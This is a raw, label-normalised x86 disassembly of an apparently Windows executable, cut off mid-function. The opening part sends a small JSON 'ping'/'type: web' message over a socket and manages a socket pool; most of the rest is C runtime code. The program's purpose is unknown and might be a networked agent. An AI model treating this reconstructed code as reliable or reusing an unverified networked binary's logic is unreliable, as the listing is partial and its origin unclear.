mov [ ebp - 0xc3 ] 0x70
mov [ ebp - 0xc2 ] 0x69
mov [ ebp - 0xc1 ] 0x6e
mov [ ebp - 0xc0 ] 0x67
mov [ ebp - 0xbf ] 0x22
mov [ ebp - 0xbe ] 0x2c
mov [ ebp - 0xbd ] 0x22
mov [ ebp - 0xbc ] 0x74
mov [ ebp - 0xbb ] 0x79
mov [ ebp - 0xba ] 0x70
mov [ ebp - 0xb9 ] 0x65
mov [ ebp - 0xb8 ] 0x22
mov [ ebp - 0xb7 ] 0x3a
mov [ ebp - 0xb6 ] 0x22
mov [ ebp - 0xb5 ] 0x77
mov [ ebp - 0xb4 ] 0x65
mov [ ebp - 0xb3 ] 0x62
mov [ ebp - 0xb2 ] 0x22
mov [ ebp - 0xb1 ] 0x7d
mov ecx [ ebp - 0xac ]
lea edi [ ebp + ecx - 0x540 ]
mov ecx 0xa
lea esi [ ebp - 0xd8 ]
[ edi ] [ esi ]
mov edx [ ebp - 0xac ]
add edx 0x28
mov [ ebp - 0xac ] edx
movzx eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xac ]
push ecx
lea edx [ ebp - 0x540 ]
push edx
call sub_403da0
add esp 0xc
push 0x0
mov eax [ ebp - 0xac ]
push eax
lea ecx [ ebp - 0x540 ]
push ecx
mov edx [ ebp - 0x1c ]
push edx
call [ send@IAT ]
mov [ ebp - 0xb0 ] eax
mov eax [ ebp - 0xb0 ]
cmp eax [ ebp - 0xac ]
jne r-xdata
movzx ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp - 0xb0 ]
push edx
lea eax [ ebp - 0x748 ]
push eax
call sub_403da0
add esp 0xc
sub_4044c0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0x4 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push eax
call sub_403990
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ecx
call sub_404720
mov ecx eax
call sub_4045d0
sub_404500
push ebp
mov ebp esp
sub esp 0xc
movzx eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x8 ] 0x1f4
jge r-xdata
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x8 ]
movzx ecx [ eax * 2 + rw-data ]
test ecx ecx
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movzx eax [ edx * 2 + rw-data ]
push eax
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx + 0x4 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push ecx
call sub_403df0
add esp 0xc
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] 0x0
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0x4 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push eax
call sub_402ff0
add esp 0x8
jmp r-xdata
sub_4045a0
push ebp
mov ebp esp
push ecx
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
push 0x40
mov eax [ ebp + 0x8 ]
push eax
call sub_404cd8
add esp 0x10
mov esp ebp
pop ebp
retn
sub_4045d0
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x4 ]
call sub_404780
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
cmp [ ebp - 0x8 ] 0x9c40
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ closesocket@IAT ]
lea ecx [ ebp - 0x4 ]
call sub_4047c0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
cmp [ eax + edx * 8 + 0x18 ] 0x0
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ edx + ecx * 8 + 0x18 ] eax
call [ GetTickCount@IAT ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ edx + ecx * 8 + 0x1c ] eax
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x4e218 ]
add ecx 0x1
mov edx [ ebp - 0xc ]
mov [ edx + 0x4e218 ] ecx
lea ecx [ ebp - 0x4 ]
call sub_4047c0
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov esp ebp
pop ebp
retn 0x4
sub_404670
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
push edx
call [ InitializeCriticalSection@IAT ]
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call [ InitializeCriticalSectionAndSpinCount@IAT ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_4046a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_404670
push 0x4e200
push 0x0
mov eax [ ebp - 0x4 ]
add eax 0x18
push eax
call sub_40a4d0
add esp 0xc
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4e218 ] 0x0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_404720
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1
jne r-xdata
mov eax rw-data
pop ebp
retn
mov ecx [ rw-data ]
or ecx 0x1
mov [ rw-data ] ecx
mov ecx rw-data
call sub_4046a0
push sub_410930
call sub_404e18
add esp 0x4
sub_404780
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
call sub_404760
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_4047e0
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x4 ]
call sub_404780
call [ GetTickCount@IAT ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ ebp - 0xc ] 0x9c40
jae r-xdata
lea ecx [ ebp - 0x4 ]
call sub_4047c0
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
cmp [ eax + edx * 8 + 0x18 ] 0x0
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
sub eax [ edx + ecx * 8 + 0x1c ]
cmp eax 0x2710
jbe r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov eax [ edx + ecx * 8 + 0x18 ]
push eax
call [ closesocket@IAT ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov [ edx + ecx * 8 + 0x18 ] 0x0
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
mov [ ecx + eax * 8 + 0x1c ] 0x0
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x4e218 ]
sub eax 0x1
mov ecx [ ebp - 0x10 ]
mov [ ecx + 0x4e218 ] eax
sub_404890
push ebp
mov ebp esp
sub esp 0x190
lea eax [ ebp - 0x190 ]
push eax
push 0x202
call [ WSAStartup@IAT ]
test eax eax
je r-xdata
call sub_404930
mov ecx eax
call sub_4037b0
call sub_404720
mov ecx eax
call sub_4047e0
xor eax eax
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn 0x4
sub_4048e0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_404890
mov [ ebp - 0x4 ] 0x0
mov esp ebp
pop ebp
retn 0x10
push 0x3e8
call [ Sleep@IAT ]
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
cmp [ ebp - 0x4 ] 0x12c
jne r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
sub_404930
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1
jne r-xdata
mov eax rw-data
pop ebp
retn
mov ecx [ rw-data ]
or ecx 0x1
mov [ rw-data ] ecx
mov ecx rw-data
call sub_4026d0
push sub_410940
call sub_404e18
add esp 0x4
sub_404992
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_404982
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_404977
pop ecx
sub_4049b3
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_405926
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_405926
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_4058d4
mov eax esi
jmp r-xdata
sub_404a12
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_405926
mov [ eax ] 0x16
call sub_4058d4
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_405dd8
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop edi
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_405b58
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_404a96
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_404c61
add esp 0x14
pop ebp
retn
sub_404af0
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp sub_406e76
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
add esi 0x1
cmp al dl
je r-xdata
mov al [ esi ]
add esi 0x1
cmp al dh
jne r-xdata
test al al
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
add esi 0x1
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
sub_404b97
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_405926
mov [ eax ] 0x16
call sub_4058d4
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp edi eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x1c ] edi
call sub_405926
mov [ eax ] 0x16
call sub_4058d4
or eax 0xffffffff
jmp r-xdata
pop esi
cmp eax ebx
jl r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi - 0x1 ] bl
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_405b58
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_404c61
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_405926
mov [ eax ] 0x16
call sub_4058d4
or eax 0xffffffff
pop ebp
retn
call sub_405926
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
call sub_4058d4
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_407225
call sub_404b97
add esp 0x18
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ esi ] 0x0
pop esi
pop ebp
retn
call sub_405926
mov [ eax ] 0x22
sub_404cf5
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_407f8a
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_407eea
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_407eea
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_404dab
mov edi edi
push esi
push 0x4
push 0x20
call sub_407e9e
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_404ddc
push 0xc
push r--data
call sub_4082b0
call sub_408000
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_404cf5
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_404e12
mov eax [ ebp - 0x1c ]
call sub_4082f5
retn
sub_404e30
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
sub ecx 0x1
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
sub ebx 0x1
jne r-xdata
sub ebx 0x1
jne r-xdata
xor eax eax
mov [ edi ] al
add edi 0x1
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
sub ecx 0x1
jne r-xdata
add edi 0x4
xor eax eax
sub ecx 0x1
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_404f5f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_40855c
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_404977
pop ecx
sub_404fa5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_4055c1
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_4085c2
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov edi rw-data
mov esi r--data
jne r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_40858e
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_4085ea
int3
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] r--data
call sub_40849f
push sub_41094f
mov [ rw-data ] esi
call sub_404e18
pop ecx
sub_405025
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push edi
push 0x7
pop ecx
xor eax eax
lea edi [ ebp - 0x1c ]
[ edi ]
pop edi
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_405926
mov [ eax ] 0x16
call sub_4058d4
or eax 0xffffffff
leave
retn
push esi
call sub_408640
pop ecx
mov ecx 0x7fffffff
mov [ ebp - 0x14 ] 0x49
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] ecx
cmp eax ecx
ja r-xdata
push [ ebp + 0x14 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
leave
retn
mov [ ebp - 0x1c ] eax
sub_405093
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push [ ebp + 0xc ]
push sub_408782
call sub_405025
add esp 0x10
pop esi
pop ebp
retn
sub_4050de
push 0x58
push r--data
call sub_4082b0
lea eax [ ebp - 0x68 ]
push eax
call [ GetStartupInfoW@IAT ]
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
push esi
push esi
push 0x1
push esi
call [ HeapSetInformation@IAT ]
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_40a1e7
test eax eax
jne r-xdata
cmp [ eax + r--data ] 0xe
jbe r-xdata
call sub_406cd9
test eax eax
jne r-xdata
push 0x1c
call sub_4050b5
xor ecx ecx
cmp [ eax + r--data ] esi
setne cl
mov [ ebp - 0x1c ] ecx
call sub_40a19b
mov [ ebp - 0x4 ] esi
call sub_409f56
test eax eax
jns r-xdata
push 0x10
call sub_4050b5
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_409ebe
mov [ rw-data ] eax
call sub_409e03
test eax eax
jns r-xdata
push 0x1b
call sub_40828a
call sub_409b8d
test eax eax
jns r-xdata
push 0x8
call sub_40828a
push 0x1
call sub_408069
pop ecx
cmp eax esi
je r-xdata
push 0x9
call sub_40828a
call sub_409b2e
test [ ebp - 0x3c ] 0x1
je r-xdata
push eax
call sub_40828a
push 0xa
pop ecx
movzx ecx [ ebp - 0x38 ]
jmp r-xdata
call sub_40826c
jmp r-xdata
push eax
call sub_408240
push ecx
push eax
push esi
push __dos_header
call sub_4048e0
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_4082f5
retn
sub_405260
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_4052e4 ]
jmp [ ecx * 4 + jump_table_405364 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4053d0 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_40556c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_405470 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40556c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4053d0 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40556c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4053d0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4053d0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4053d0 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40556c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40556c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40556c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
